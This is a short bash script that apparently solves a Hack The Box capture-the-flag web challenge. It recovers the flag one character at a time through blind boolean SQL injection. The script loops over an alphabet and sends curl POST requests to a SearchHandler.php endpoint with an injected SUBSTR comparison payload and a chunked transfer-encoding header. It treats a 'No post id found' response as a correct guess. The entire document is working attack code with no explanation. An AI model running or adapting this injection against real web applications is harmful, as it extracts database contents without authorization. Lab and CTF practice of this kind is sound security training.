#!/bin/bash

HOST="localhost:1337"
HOST="94.237.49.138:31006"

# This alphabet speeds up the search even though it's not complete
ALPHABET="_!}0123456789?abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~"

FLAG="HTB{"

for (( k=${#FLAG}; k<36; k++ )); do
	for (( i=0; i<${#ALPHABET}; i++ )); do
		test_flag="${FLAG}${ALPHABET:$i:1}"
		# if this query returns "No post id found" it means that the character is correct
		res=$(curl -s "http://$HOST/Controllers/Handlers/SearchHandler.php" \
			-H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
			-H 'Transfer-Encoding: chunked' \
			--data-binary "search=6' AND SUBSTR(gamedesc,1,$((k+1))) = '${test_flag}'; -- ")
		if [[ $res =~ "No post id found" ]] ; then
			FLAG="${FLAG}${ALPHABET:$i:1}"
			break
		fi
	done
	echo $FLAG
done

